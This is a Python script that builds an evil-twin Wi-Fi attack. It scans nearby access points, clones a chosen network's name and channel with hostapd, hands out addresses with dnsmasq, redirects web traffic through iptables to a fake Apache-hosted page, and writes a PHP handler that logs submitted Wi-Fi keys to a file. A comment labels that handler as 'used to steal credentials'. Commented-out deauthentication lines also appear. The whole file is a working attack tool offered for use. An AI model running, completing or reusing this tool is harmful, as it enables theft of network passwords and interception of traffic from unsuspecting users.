import subprocess
import csv
from threading import Timer
from os import system
import time

subprocess.call(['rm', 'output-01.csv'])
subprocess.call(['airmon-ng', 'start', 'wlan0'])
p = subprocess.Popen(["airodump-ng", "wlan0mon", "-w", "output", "--output-format", "csv"])
time.sleep(10)
p.terminate()

#subprocess.call(["airmon-ng", "start", "wlan0"])
#print('Press Ctrl + C to choose an Access Point')
#system('airodump-ng wlan0mon -w output --output-format csv')

macAddr = ''
channel = ''
name = ' ' + input("Type in Access Point name: ")
with open('output-01.csv', newline='') as f:
    for row in f:
        line = row.split(',')
        # If you take in some argument here instead of hardcoded AP name
        if (name in line):
            #print(line)
            macAddr = line[0]
            channel = line[3].replace(" ", "")
        #print(macAddr)
        #print(channel)

#print(name)
#print(macAddr)
#print(channel)



subprocess.call(['rm', 'hostapd.conf'])

with open('hostapd.conf', 'w') as f:
    f.write('interface=wlan0mon\n')
    f.write('driver=nl80211\n')
    f.write('ssid=' + name[1:] + '\n')
    f.write('hw_mode=g\n')
    f.write('channel=' + channel + '\n')
    #f.write('wpa_passphrase=password\n')


#subprocess.call(['airodump-ng', '--bssid', macAddr, '-w', 'client_bssids', '--output-format', 'csv', 'wlan0mon'])
#subprocess.call(['aireplay-ng', '--deauth', '20'  , '-a', macAddr, 'wlan0mon'])


# Parse localhost IP address
process1 = subprocess.Popen(['ifconfig', 'eth0'], stdout=subprocess.PIPE)
process2 = subprocess.Popen(['grep', 'inet '], stdin=process1.stdout, stdout=subprocess.PIPE)
process3 = subprocess.Popen(['awk', '-F[: ]+', '{ print $3 }'], stdin=process2.stdout, stdout=subprocess.PIPE)
# IP address in string format
ipAddr = process3.stdout.read().decode('utf-8')[:-1]


# Configure iptables to reroute traffic
subprocess.call(['ifconfig', 'wlan0mon', 'up', '192.168.1.1', 'netmask', '255.255.255.0'])
subprocess.call(['route', 'add', '-net', '192.168.1.0', 'netmask', '255.255.255.0', 'gw', '192.168.1.1'])
subprocess.call(['iptables', '--table', 'nat', '--append', 'POSTROUTING', '--out-interface', 'eth0', '-j', 'MASQUERADE'])
subprocess.call(['iptables', '--append', 'FORWARD', '--in-interface', 'wlan0mon', '-j', 'ACCEPT'])
subprocess.call(['echo', '1', '>', '/proc/sys/net/ipv4/ip_forward'])
subprocess.call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', ipAddr + ':80'])
subprocess.call(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-j', 'MASQUERADE'])
#subprocess.call(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-p', 'tcp', '-d', '192.168.1.125', '--dport', '80', '-j', 'SNAT', '--to-source', '192.168.1.1'])

subprocess.Popen(['hostapd', 'hostapd.conf'])

subprocess.call(['rm', 'dnsmasq.conf'])

with open('dnsmasq.conf', 'w') as f:
    f.write('interface=wlan0mon\n')
    f.write('dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n')
    f.write('dhcp-option=3,192.168.1.1\n')
    f.write('dhcp-option=6,192.168.1.1\n')
    f.write('server=8.8.8.8\n')
    f.write('log-queries\n')
    f.write('log-dhcp\n')
    f.write('listen-address=127.0.0.1\n')

subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf', '-d'])

# Move Fake website into the directory that Apache hosts
subprocess.call(['cp', './website/index.html', '/var/www/html/'])
subprocess.call(['cp', './website/save.php', '/var/www/html/'])
subprocess.call(['cp', '-r','./website/images', '/var/www/html/'])
subprocess.call(['cp', '-r','./website/include', '/var/www/html/'])
subprocess.call(['cp', './website/log.txt', '/var/www/html/'])
# Give write access to the log.txt file
subprocess.call(['chmod', '777', '/var/www/html/log.txt'])

# Start the Apache sever to run fake website
subprocess.call(['/etc/init.d/apache2', 'start'])

# Create the php file used to steal credentials
subprocess.call(['rm', './website/save.php'])
with open('./website/save.php', 'w') as f:
    f.write('<?php\n')
    f.write('session_start();\n')
    f.write('ob_start();\n')
    f.write('$key1=$_POST[\'key1\'];\n')
    f.write('$file = fopen(\'log.txt\', \'a\');\n')
    f.write('fwrite($file, \'\' . \'' + name[1:] +  '\' . \':\' . $key1 . PHP_EOL);\n')
    f.write('fclose($file);\n')
    f.write('echo \"Success!\";\n')
    f.write('sleep(6);\n')
    f.write('ob_end_flush();\n')
    f.write('?>\n')

